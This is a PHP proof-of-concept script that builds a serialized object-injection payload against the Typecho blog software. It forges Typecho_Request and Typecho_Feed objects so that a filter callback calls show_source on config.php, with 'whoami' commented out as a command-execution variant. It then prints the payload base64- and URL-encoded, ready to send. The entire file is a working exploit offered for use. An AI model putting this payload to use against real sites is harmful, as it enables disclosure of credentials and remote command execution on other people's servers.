<?php
class Typecho_Request
{
    private $_params = array();
    private $_filter = array();
    public function __construct()
    {
        // $this->_params['screenName'] = 'whoami';
        $this->_params['screenName'] = "config.php";
        $this->_filter[0] = 'show_source';
    }
}
class Typecho_Feed
{
    const RSS2 = 'RSS 2.0';
    /** 定义ATOM 1.0类型 */
    const ATOM1 = 'ATOM 1.0';
    /** 定义RSS时间格式 */
    const DATE_RFC822 = 'r';
    /** 定义ATOM时间格式 */
    const DATE_W3CDTF = 'c';
    /** 定义行结束符 */
    const EOL = "\n";
    private $_type;
    private $_items = array();
    public $dateFormat;
    public function __construct()
    {
        $this->_type = self::RSS2;
        $item['link'] = '1';
        $item['title'] = '2';
        $item['date'] = 1507720298;
        $item['author'] = new Typecho_Request();
        $item['category'] = array(new Typecho_Request());
        
        $this->_items[0] = $item;
    }
}
$x = new Typecho_Feed();
$a = array(
    'host' => 'localhost',
    'user' => 'xxxxxx',
    'charset' => 'utf8',
    'port' => '3306',
    'database' => 'typecho',
    'adapter' => $x,
    'prefix' => 'typecho_'
);
echo urlencode(base64_encode(serialize($a)));
?>